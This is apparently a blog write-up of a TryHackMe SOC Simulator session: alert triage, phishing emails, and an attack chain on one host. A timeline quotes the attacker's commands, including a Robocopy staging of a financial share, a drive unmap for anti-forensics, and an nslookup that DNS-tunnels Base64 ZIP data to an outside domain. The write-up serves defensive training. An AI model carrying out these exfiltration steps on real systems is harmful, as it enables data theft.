---
title: "SOC Simulator: Triaging a Phishing Wave and Catching a Live Data Exfiltration"
date: 2026-07-09 12:00:00 +0600
categories: [Writeups, TryHackMe]
tags: [soc-simulator, tryhackme, siem, threat-hunting, incident-response, sysmon, dns-tunneling, dfir]
---

## Overview

TryHackMe's **SOC Simulator** drops you into a live alert queue and scores you the way a real SOC would: on whether you correctly separate noise from an actual breach, and on how fast you do it. This run gave me 35 closed alerts spanning benign Windows internals, a wave of phishing emails, and — buried in the middle of it — a genuine attack chain that ran from initial reconnaissance to DNS-based data exfiltration in under four minutes.

**Result:** Victory — 1st place, 1070 points (+950 this run), true positive rate of 69.44%, an improvement over previous attempts.

![Victory banner - Security breach prevented](/assets/img/thm-soc-sim-phishing/01-victory-banner.png)
_1st place, 1070 pts, true positive rate 69.44% — an improvement over previous runs_

| Metric | Value |
|---|---|
| Closed alerts | 35 |
| True positive identification rate | 100% |
| False positive identification rate | 50% |
| Mean time to resolve | 4 minutes |
| Mean dwell time | 31 minutes |

![Closed alerts, mean time to resolve, mean dwell time](/assets/img/thm-soc-sim-phishing/04-closed-alerts-summary.png)

The 100%/50% split is worth pausing on: I never missed a real threat, but half of my "false positive" calls were on alerts that shouldn't have fired in the first place. That gap is really a story about detection engineering, not analyst error — more on that below.

## The Noise: Benign Alerts Misfired by an Over-Tuned Rule

A cluster of alerts all shared the same detection logic — "suspicious process with an uncommon parent-child relationship" — and all five turned out to be textbook-normal Windows behavior:

| Process | Parent | Verdict | Why it's actually normal |
|---|---|---|---|
| `TrustedInstaller.exe` | `services.exe` | Benign | Windows Modules Installer, standard SCM-launched service |
| `taskhostw.exe KEYROAMING` (x2) | `svchost.exe` | Benign | Task Scheduler spawning a background task for roaming profile sync |
| `rdpclip.exe` | `svchost.exe` | Benign | RDP clipboard monitor, launched by the TermService-hosting svchost |
| `svchost.exe -k wsappx -p` | `services.exe` | Benign | Standard service-host launch for the Microsoft Store / AppX deployment service group |

The pattern across all five: the detection rule assumed a narrow set of "expected" parents (mainly `winlogon.exe`) and flagged anything outside that baseline — but `services.exe → svchost.exe` and `svchost.exe → taskhostw.exe`/`rdpclip.exe` are actually the standard way these processes start. This is exactly the kind of gap a SOC lead would want tuned out with an allowlist, since it's pure alert fatigue: every one of these consumes analyst time that should go toward alerts like the one below.

![True positive rate and false positive rate donut charts](/assets/img/thm-soc-sim-phishing/03-tp-fp-rates.png)
_100% true positive identification vs. a 50% false positive rate on the same "uncommon parent-child relationship" rule_

![True positives table with alert rule, severity, time to resolve, and classification](/assets/img/thm-soc-sim-phishing/02-true-positives-table.png)
_Full alert table: phishing and process alerts marked Incorrect, correctly-classified process alerts marked Correct_

## The Phishing Wave

Three inbound emails landed in the same window, all targeting employees at the same company and all using classic social engineering hooks:

1. **"Grow Your Hat Business Overnight with this Secret Formula"** — sent from a `.xyz` domain, generic hype language, no attachment (payload was the embedded link).
2. **"Buy 100 Hats Get 99 Free"** — sent from a free Gmail account impersonating a wholesale B2B deal, artificial urgency, too-good-to-be-true pricing.
3. **"Win a Trip to Hat Disneyland"** — sent from a `.online` domain, riffing on Disney's trademark, framed as a lottery win.

All three were marked **true positive**. None carried attachments, which is itself notable — the attacker relied entirely on the link and the pretext to get a click, a pattern that slips past attachment-based email security controls and puts the burden back on user awareness and URL filtering.

## The Real Incident: Kill Chain on win-3450

This is the part that actually earned the score. A single host, a single user (`michael.ascot`), and one `powershell.exe` process (PID 3728) walked through a complete attack lifecycle in under four minutes:

| Time | Action | Stage |
|---|---|---|
| 07:03:39 | `powershell.exe` drops `PowerView.ps1` into `Downloads\` | **Reconnaissance** — AD enumeration tooling staged |
| 07:05:34 | `net.exe use Z: \\FILESRV-01\SSF-FinancialRecords` | **Access** — maps the financial records share |
| 07:06:21 | `Robocopy.exe . C:\Users\michael.ascot\downloads\exfiltration /E` | **Collection** — recursively copies the share to a local staging folder |
| 07:06:32 | `net.exe use Z: /delete` | **Defense evasion** — unmaps the drive to erase the access trail |
| 07:07:19 | `nslookup.exe <base64-blob>.haz4rdw4re.io` | **Exfiltration** — DNS tunneling out of a ZIP-encoded payload |

A few details made this unambiguous rather than merely suspicious:

- **PowerView.ps1** is a known Active Directory reconnaissance tool from the PowerSploit toolkit — it has no legitimate reason to exist in a standard user's Downloads folder.
- Every subsequent step traced back to the **same parent PID (3728)**, showing one continuous, scripted operation rather than isolated events.
- The share name itself — `SSF-FinancialRecords` — signals the attacker had already identified a high-value target.
- The `nslookup` query started with `UEsDBBQ...`, the Base64-encoded magic header for a ZIP file, embedded as a DNS subdomain — a clean DNS tunneling exfiltration technique that bypasses controls looking only at HTTP/S egress.
- Deleting the mapped drive immediately after the copy is a deliberate anti-forensics step, not routine cleanup — timing is what separates it from the benign "network drive disconnected" alerts elsewhere in the queue.

**Recommended response** for this chain: isolate the host immediately, kill the PowerShell process tree, force a credential reset for `michael.ascot`, sinkhole/block the exfil domain, audit `FILESRV-01` access logs for the exact files touched, and preserve the staging folder for forensics before remediation.

## Lessons Learned

The platform's AI-generated feedback on my reporting was accurate and worth internalizing: I covered the **What** and **Why** of each alert well, but was inconsistent on documenting the **When** (precise timestamps) and being explicit about **Who** and **Where** in every report. A SOC report is only as useful as its weakest 5W — I'm treating that as the concrete thing to fix before the next run.

The bigger takeaway, though, is about detection tuning rather than my own analysis: a 50% false-positive rate on a single rule is a real operational risk, not a rounding error. In a live SOC drowning in `services.exe → svchost.exe` noise, an analyst desensitized to that rule could easily have deprioritized the `powershell.exe → net.exe → Robocopy.exe → nslookup.exe` chain that mattered. Cutting false positives isn't just about analyst comfort — it's what keeps the real chain visible.

---

*Platform: [TryHackMe SOC Simulator](https://tryhackme.com/soc-sim)*
